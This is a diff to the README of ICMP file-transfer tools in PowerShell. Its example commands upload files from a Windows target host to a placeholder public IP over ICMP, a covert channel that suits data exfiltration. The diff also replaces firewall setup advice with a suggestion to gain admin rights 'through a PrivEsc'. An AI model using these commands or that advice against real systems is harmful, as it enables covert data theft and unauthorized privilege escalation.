@@ -70,14 +70,12 @@ Invoke-IcmpUpload -ServerIP YourPublicIP -FileName FileToUpload
 - Run PowerShell as administrator before executing these scripts.
 
 ### Alternative Without Admin Rights:
-- If admin rights are unavailable, use Windows Firewall Advanced Settings to manually allow ICMP traffic.
+- If admin rights are unavailable, get them through a PrivEsc 
 
 ## PowerShell vs Python Version
 With the conversion of ICMP-ReceiveFile.py and ICMP-SendFile.py to PowerShell, there are no fundamental changes to the way these tools function. The PowerShell versions remain fully compatible with Invoke-IcmpDownload.ps1 and Invoke-IcmpUpload.ps1, maintaining seamless file transfers.
 
 ### Key Differences & Alternative Considerations
-- **Administrative Rights:** Unlike Python, PowerShell requires admin privileges to modify ICMP firewall rules. If admin rights are unavailable, manually enabling ICMP traffic in Windows Firewall is required.
-- **Cross-Platform Compatibility:** The Python versions allowed execution across multiple operating systems, whereas the PowerShell scripts are Windows-exclusive.
 - **Performance Considerations:** PowerShell's handling of ICMP packets might introduce slight differences in execution timing, but this does not impact overall functionality.
 
 ## Validation
@@ -96,27 +94,27 @@ To ensure all components work correctly together, follow these steps:
 1. Ensure you have administrative privileges on the Windows host.
 2. Open PowerShell with elevated rights.
 3. Set the execution policy to allow the running of scripts:
-   ```powershell
+   ```
    Set-ExecutionPolicy RemoteSigned
    ```
 
 #### Testing File Download to Windows Host:
 - **On the Sender Machine:**
-  ```powershell
+  ```
   ICMP-SendFile.ps1 -source YourPublicIP -destination TargetIP -file FileToSend
   ```
 - **On the Windows Host:**
-  ```powershell
+  ```
   .\Invoke-IcmpDownload.ps1 -ServerIP YourPublicIP -FileName FileToDownload
   ```
 
 #### Testing File Upload from Windows Host:
 - **On the Receiver Machine:**
-  ```powershell
+  ```
   ICMP-ReceiveFile.ps1 -src ClientIP -file DestinationFileName
   ```
 - **On the Windows Host:**
-  ```powershell
+  ```
   .\Invoke-IcmpUpload.ps1 -ServerIP YourPublicIP -FileName FileToUpload
   ```
 
